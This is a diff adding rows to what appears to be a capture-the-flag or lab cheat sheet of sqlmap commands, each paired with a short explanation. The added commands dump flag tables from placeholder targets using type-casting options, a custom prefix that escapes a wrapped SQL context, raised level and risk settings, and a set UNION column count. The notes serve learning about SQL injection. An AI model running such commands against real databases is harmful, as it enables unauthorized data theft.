@@ -234,4 +234,6 @@ python sqlmap.py
 | `sqlmap -u "http://target:port/test.php" --cookie="id=1" -D testdb -T flag3 --dump` | Repeat same process as ABOVE example ^ |
 | `POST /test.php {"id":1}` | With JSON, use BurpSuite -> Proxy -> Send to Repeater -> Copy to file -> Cat the file in bash |
 | `sqlmap -r test.txt -pd id --dbs --batch` | Same process, find DB -> find tables inside DB -> dump flag |
-
+| `sqlmap -u "http://TARGET/case5.php?id=1" -D testdb -T flag5 --dump --no-cast --fresh-queries` | Dumped the flag table while disabling type casting to prevent corrupted or escaped output. Fresh queries ensured clean retrieval of binary flag data. |
+| `sqlmap -u "http://TARGET/case6.php?col=id" --prefix='`)' --level=5 --risk=3 -D testdb -T flag6 --dump --no-cast` | Used a custom prefix to escape out of a wrapped SQL context (backticks + parentheses). Higher level and risk were required to detect and exploit the injection. |
+| `sqlmap -u "http://TARGET/case7.php?id=1" --union-cols=5 --no-cast -D testdb -T flag7 --dump` | Exploited a UNION-based SQL injection by specifying the correct number of columns. Disabling casting preserved the correct flag output. |
